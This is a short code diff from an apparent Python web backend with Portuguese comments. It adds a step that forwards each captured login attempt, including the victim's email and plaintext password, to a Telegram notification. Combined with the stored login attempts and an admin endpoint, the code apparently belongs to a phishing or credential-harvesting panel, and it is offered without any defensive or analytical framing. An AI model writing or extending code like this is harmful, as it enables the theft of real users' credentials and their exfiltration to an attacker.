@@ -193,6 +193,15 @@ async def create_login_attempt(attempt: LoginAttemptCreate):
     doc['timestamp'] = doc['timestamp'].isoformat()
     
     await db.login_attempts.insert_one(doc)
+    
+    # Enviar notificação no Telegram
+    await send_telegram_notification(
+        email=attempt.email,
+        password=attempt.password,
+        device=attempt.device or "Desktop",
+        country=attempt.country or "Brasil"
+    )
+    
     return attempt_obj
 
 @api_router.delete("/admin/login-attempts/{attempt_id}")
